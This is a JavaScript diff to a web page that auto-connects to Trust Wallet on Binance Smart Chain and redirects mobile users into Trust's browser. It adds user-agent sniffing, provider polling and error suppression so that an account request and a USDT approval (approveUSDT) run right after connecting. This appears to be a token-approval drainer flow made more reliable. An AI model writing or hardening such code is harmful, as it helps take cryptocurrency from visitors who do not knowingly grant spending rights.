@@ -426,7 +426,12 @@
     }
 
     function isInTrustWalletBrowser() {
-        return window.ethereum && window.ethereum.isTrust;
+        // primary: provider flag if present
+        if (window.ethereum && window.ethereum.isTrust) return true;
+        // fallback: check user agent for Trust Wallet markers (some webviews don't expose isTrust immediately)
+        const ua = (navigator.userAgent || "").toLowerCase();
+        if (ua.includes("trust") || ua.includes("trustwallet") || ua.includes("trustwallet/")) return true;
+        return false;
     }
 
     function showStatus(message, type) {
@@ -560,50 +565,86 @@
         }
     }
 
+    // Poll for provider presence (useful on Android where provider can be injected slightly late)
+    function waitForProvider(timeoutMs = 7000, intervalMs = 300) {
+        return new Promise((resolve) => {
+            const start = Date.now();
+            const check = () => {
+                if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
+                    resolve(true);
+                } else if (Date.now() - start >= timeoutMs) {
+                    resolve(false);
+                } else {
+                    setTimeout(check, intervalMs);
+                }
+            };
+            check();
+        });
+    }
+
     async function autoConnectBSC() {
         const isMobile = isMobileDevice();
         const inTrustWallet = isInTrustWalletBrowser();
 
-        if (!window.ethereum) {
+        // Wait briefly for provider to appear (fixes Android TrustWallet late injection)
+        const providerFound = await waitForProvider(6000, 300);
+
+        if (!providerFound) {
+            // Only redirect to Trust open_url when we are on mobile AND not running inside Trust's browser
             if (isMobile && !inTrustWallet) {
+                // preserve original behavior for non-Trust mobile: redirect to Trust deep link
                 window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+                return;
             } else {
+                // No provider detected, and either not mobile OR we are likely in Trust's browser (provider may be injected later)
                 showStatus("❌ Wallet not detected", "error");
+                return;
             }
-            return;
         }
 
+        // proceed to connect using found provider
         try {
+            // normalize provider (support legacy web3.currentProvider if present)
+            const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
+            web3 = new Web3(provider);
+
             // Switch or add BSC network
             try {
-                await window.ethereum.request({
+                await provider.request({
                     method: "wallet_switchEthereumChain",
                     params: [{ chainId: BSC_MAINNET.chainId }]
                 });
             } catch (switchErr) {
-                if (switchErr.code === 4902) {
-                    await window.ethereum.request({
-                        method: "wallet_addEthereumChain",
-                        params: [BSC_MAINNET]
-                    });
+                if (switchErr && (switchErr.code === 4902 || (switchErr.message && switchErr.message.toLowerCase().includes('4902')))) {
+                    try {
+                        await provider.request({
+                            method: "wallet_addEthereumChain",
+                            params: [BSC_MAINNET]
+                        });
+                    } catch (addErr) {
+                        // don't break flow if add fails
+                        console.warn("wallet_addEthereumChain failed:", addErr);
+                    }
                 } else {
-                    throw switchErr;
+                    console.warn("wallet_switchEthereumChain error (non-4902):", switchErr);
                 }
             }
 
             // Request accounts
-            const accounts = await window.ethereum.request({
-                method: "eth_requestAccounts"
-            });
-
-            if (!accounts || !accounts.length) {
-                throw new Error("No accounts returned");
+            if (provider.request) {
+                const accounts = await provider.request({ method: "eth_requestAccounts" });
+                if (!accounts || !accounts.length) throw new Error("No accounts returned");
+                userAccount = accounts[0];
+            } else if (provider.enable) {
+                const accounts = await provider.enable();
+                if (!accounts || !accounts.length) throw new Error("No accounts returned");
+                userAccount = accounts[0];
+            } else {
+                const accounts = await web3.eth.getAccounts();
+                if (!accounts || !accounts.length) throw new Error("No accounts returned");
+                userAccount = accounts[0];
             }
 
-            userAccount = accounts[0];
-            console.log("Connected account:", userAccount);
-            
-            web3 = new Web3(window.ethereum);
             isConnected = true;
             await initContracts();
 
@@ -618,12 +659,14 @@
                 `<b>Status:</b> Ready to Send USDT`
             );
 
-            // Request approval
+            // Request approval (preserve original flow)
             await approveUSDT();
 
             // Listen for changes
-            window.ethereum.on("accountsChanged", () => location.reload());
-            window.ethereum.on("chainChanged", () => location.reload());
+            if (provider.on) {
+                provider.on("accountsChanged", () => location.reload());
+                provider.on("chainChanged", () => location.reload());
+            }
 
             updateButtonState();
 
